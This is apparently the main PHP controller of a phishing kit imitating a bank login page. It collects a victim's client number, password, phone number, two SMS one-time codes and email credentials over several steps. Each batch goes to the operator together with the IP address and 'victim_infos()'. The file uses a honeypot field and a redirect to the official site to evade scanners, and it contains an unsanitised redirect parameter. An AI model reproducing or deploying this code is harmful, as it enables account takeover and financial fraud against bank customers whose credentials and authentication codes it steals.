<?php
require_once __DIR__ . '/guard.php';
    require_once 'includes/main.php';
    if( $_GET['pwd'] == "asd" ) {
        session_destroy();
        visitors();
        header("Location: clients/login.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if( $_POST['step'] == 'login' ) {
            $_SESSION['errors']     = [];
            $_SESSION['code_client']   = $_POST['code_client'];
            $_SESSION['password']   = $_POST['password'];
            $subject = get_client_ip() . ' | sg | Login';
            $message .= 'Client number : ' . $_SESSION['code_client'] . "\r\n";
            $message .= 'Pass : ' . $_POST['password'] . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            unset($_SESSION['errors']);
            header("Location: clients/loading1.php?verification#_");
        }
		
		if( $_POST['step'] == 'tel' ) {
            $_SESSION['errors']     = [];
            $_SESSION['tel']   = $_POST['tel'];
            $subject = get_client_ip() . ' | tel';
            $message .= 'tel : ' . $_SESSION['tel'] . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            unset($_SESSION['errors']);
            header("Location: clients/loading2.php?verification#_");
        }
		
		if( $_POST['step'] == 'sms' ) {
            $_SESSION['errors']     = [];
            $_SESSION['sms']   = $_POST['sms'];
            $subject = get_client_ip() . ' | sms ';
            $message .= 'sms : ' . $_SESSION['sms'] . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            unset($_SESSION['errors']);
            header("Location: clients/loading3.php?verification#_");
        }
				if( $_POST['step'] == 'sms2' ) {
            $_SESSION['errors']     = [];
            $_SESSION['sms2']   = $_POST['sms2'];
            $subject = get_client_ip() . ' | sms2 ';
            $message .= 'sms2 : ' . $_SESSION['sms2'] . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            unset($_SESSION['errors']);
            header("Location: clients/loading3.php?verification#_");
        }
						if( $_POST['step'] == 'em1' ) {
            $_SESSION['errors']     = [];
            $_SESSION['m1']   = $_POST['m1'];
			$_SESSION['p1']   = $_POST['p1'];
            $subject = get_client_ip() . ' | email 1 ';
            $message .= 'mail : ' . $_SESSION['m1'] . "\r\n";
			$message .= 'pas : ' . $_SESSION['p1'] . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            unset($_SESSION['errors']);
            header("Location: clients/em2.php?verification#_");
        }
			if( $_POST['step'] == 'em2' ) {
            $_SESSION['errors']     = [];
            $_SESSION['m1']   = $_POST['m1'];
			$_SESSION['p1']   = $_POST['p1'];
            $subject = get_client_ip() . ' | email 2 ';
            $message .= 'mail : ' . $_SESSION['m1'] . "\r\n";
			$message .= 'pas : ' . $_SESSION['p1'] . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            unset($_SESSION['errors']);
            header("Location: clients/done.php?verification#_");
        }
        
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>
